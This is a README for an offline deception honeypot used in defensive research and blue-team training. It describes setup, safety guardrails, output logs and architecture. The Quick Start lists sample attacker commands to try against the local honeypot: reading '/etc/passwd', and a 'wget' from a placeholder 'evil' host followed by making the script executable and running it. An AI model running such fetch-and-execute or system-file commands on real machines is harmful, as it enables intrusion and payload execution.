# The Ultimate Honeypot (Offline Defensive Research Platform)

An **offline, AI-inspired deception honeypot** for defensive research, blue team training, purple team exercises, threat hunting, and detection engineering.

This platform is intentionally designed to:
- Simulate vulnerable-seeming services (SSH/Telnet/HTTP-like interactive sessions).
- Use local generative response logic to maintain believable deception.
- Capture attacker behaviors as structured evidence.
- Map activity to MITRE ATT&CK techniques.
- Export SOC-ready JSONL logs and a consolidated incident report.

## Safety Guardrails

This project is **defensive-only** and enforces:
- No real command execution from attacker input.
- No cloud AI service calls.
- No real credentials.
- No access to real enterprise systems.
- No payload detonation.

## Quick Start

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 main.py
```

Then connect locally from a second terminal:

```bash
nc 127.0.0.1 2222
```

Try commands like `whoami`, `uname -a`, `cat /etc/passwd`, `wget http://evil`, `chmod +x a.sh`, `./a.sh`.

## Output

Artifacts are written under `artifacts/`:
- `session_events.jsonl`
- `alerts.jsonl`
- `ioc_summary.json`
- `soc_report.md`

## Architecture

- `main.py` – Entry point.
- `honeypot/engine.py` – TCP listener/session orchestration.
- `honeypot/deception.py` – Offline AI-inspired deception responder.
- `honeypot/detection.py` – ATT&CK mapping + detections.
- `honeypot/evidence.py` – Structured logging/reporting.
- `honeypot/models.py` – Typed event and alert structures.
- `honeypot/config.py` – Safe defaults and guardrails.

